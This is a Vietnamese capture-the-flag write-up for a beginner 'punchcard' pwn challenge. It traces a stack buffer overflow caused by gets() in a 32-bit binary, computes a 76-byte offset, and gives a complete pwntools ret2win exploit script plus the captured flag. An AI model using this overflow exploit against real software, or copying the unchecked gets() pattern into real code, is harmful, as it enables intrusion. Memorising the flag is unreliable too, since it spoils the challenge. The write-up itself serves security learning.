# Writeup PWN1 — punchcard

## 1. Tổng quan

Bài `punchcard` là một bài pwn dạng **ret2win** cơ bản. Chương trình có sẵn hàm `win()`, nhiệm vụ của ta là tìm lỗi tràn bộ đệm để ghi đè saved return address và chuyển luồng thực thi về `win()`.


Kiểm tra file và chạy thử 

<img width="1172" height="497" alt="image" src="https://github.com/user-attachments/assets/4e2d7c11-0d58-42ea-80fb-8ea54ddcd100" />


-> kết quả Binary là ELF 32-bit, không strip và có symbol rõ. Ngoài ra khi chạy, chương trình còn in trực tiếp địa chỉ hàm `win()` ra màn hình:


Tư duy  hướng khai thác hợp lý là:

```text
buffer overflow -> overwrite return address -> ret2win
```

---

## 2. Phân tích hàm `main`

Trong IDA, hàm `main()` in banner, in địa chỉ hàm `win()`, sau đó gọi `process_punchcard()`.

<img width="752" height="573" alt="image" src="https://github.com/user-attachments/assets/6fa42320-4409-4f18-b3e4-49c7b51f1511" />


Đoạn quan trọng trong `main`:

```c
printf("[DEBUG] win() function loaded at: %p\n", win);
process_punchcard(&argc);
```

Cụ thể:

- `win()` đã có sẵn trong binary.
- Địa chỉ `win()` là cố định: `0x080491d6`.
- Sau khi in địa chỉ `win()`, chương trình gọi `process_punchcard()`, nên cần kiểm tra hàm này để tìm bug.

---

## 3. Tìm bug trong `process_punchcard`

Trong IDA, hàm `process_punchcard()` có buffer local tên `s`:

<img width="771" height="401" alt="image" src="https://github.com/user-attachments/assets/61ec5095-af4e-4a48-8c4e-2e397f644879" />


Đoạn code quan trọng:

```c
int process_punchcard()
{
    char s[68];

    printf(" CARD> ");
    fflush(stdout);

    gets(s);

    printf(" READING CARD: [%.40s", s);
    ...
}
```

Bug nằm ở dòng:

```c
gets(s);
```

`gets()` là hàm nguy hiểm vì nó đọc input cho tới khi gặp newline và **không kiểm tra độ dài**. Trong khi đó buffer `s` nằm trên stack, nên nếu nhập chuỗi dài hơn kích thước buffer, dữ liệu sẽ ghi tràn qua saved EBP và saved return address.

=> Đây là lỗi **stack buffer overflow**.

---

## 4. Tính offset tới return address

IDA cho biết buffer `s` nằm tại:

```asm
s = byte ptr -48h
```

Tức là buffer bắt đầu ở:

```text
[ebp - 0x48]
```

Saved return address nằm ở:

```text
[ebp + 0x04]
```

Vậy khoảng cách từ đầu buffer `s` tới saved return address là:

```text
0x48 + 0x04 = 0x4c = 76 bytes
```

Do đó offset cần dùng là:

```text
offset = 76
```

---

## 5. Payload

Ta cần ghi đè saved return address bằng địa chỉ hàm `win()`:

```text
win = 0x080491d6
```

Payload:

```python
payload  = b"A" * 76
payload += p32(0x080491d6)
```

Vì binary là 32-bit little-endian nên địa chỉ `win()` được pack bằng `p32()`.

---

## 6. Exploit hoàn chỉnh

File `solve.py`:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./punchcard", checksec=False)
context.log_level = "info"

WIN = 0x080491d6
OFFSET = 76


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(elf.path)


p = start()

payload  = b"A" * OFFSET
payload += p32(WIN)

p.sendlineafter(b"CARD> ", payload)
p.interactive()
```

Kết quả exploit:  flag{6aaec008-6443-43b2-ac16-6bace2b03269}
